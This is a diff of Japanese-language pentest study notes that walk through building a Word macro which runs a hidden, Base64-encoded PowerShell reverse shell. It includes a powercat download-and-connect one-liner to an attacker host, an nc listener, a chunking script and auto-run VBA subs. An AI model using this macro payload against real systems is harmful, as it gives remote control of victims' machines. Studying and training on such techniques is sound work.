@@ -175,20 +175,19 @@ sudo rlwrap nc -lvnp 4444
 IEX (New-Object Net.Webclient).downloadstring('http://<attacker_IP>/powercat.ps1');powercat -c <attacker_IP> -p <port> -e powershell
 ```
 
-3. 特殊文字による実行失敗を防ぐため、Base64エンコードする：[[シェル]]
-
+3. 特殊文字による実行失敗を防ぐため、Base64エンコードする：[Base64化したPowerShellリバースシェルワンライナー](../../Cheatsheet/Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)
 
 4. Base64エンコードした文字列を50文字ずつに分割し、`Str = Str + "[分割後のbase64文字列]"`の形式で出力するPythonスクリプトを実行
 ```python
-str = "powershell.exe -nop -w hidden -enc [Base64エンコード後文字列]"
+str = "powershell.exe -nop -w hidden -enc <Base64エンコード後文字列>"
 
 n = 50
 
 for i in range(0, len(str), n):
-	print("Str = Str + " + '"' + str[i:i+n] + '"')
+    print("Str = Str + " + '"' + str[i:i+n] + '"')
 ```
-- `n = 50`：VBAは255文字の制限ではあるが環境差異を考慮した値。なんでもいいが、100でもうまくいく可能性はある。
-- `range(0, len(str), n)`：0から str の長さまで、n（例: 50）文字単位で繰り返す
+- `n = 50`：VBAの255文字制限に余裕を持たせた値（100でも動く可能性はある）
+- `range(0, len(str), n)`：0から str の長さまで、n文字単位で繰り返す
 - `str[i:i+n]`：文字列 str の i から i+n の範囲を切り出す（部分文字列）
 
 ![](../../画像ファイル/Pasted%20image%2020250517181019.png)
@@ -198,15 +197,11 @@ $$Pythonスクリプト実行結果$$
 5. マクロ編集画面で文字列型の変数を宣言し、Base64エンコードして分割した文字列を変数で連結していく
 ```vb
 Sub AutoOpen()
-
     MyMacro
-    
 End Sub
 
 Sub Document_Open()
-
     MyMacro
-    
 End Sub
 
 Sub MyMacro()
@@ -217,8 +212,6 @@ Sub MyMacro()
 	Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
 	Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
     ...
-	Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
-	Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
 	Str = Str + "A== "
 
     CreateObject("Wscript.Shell").Run Str
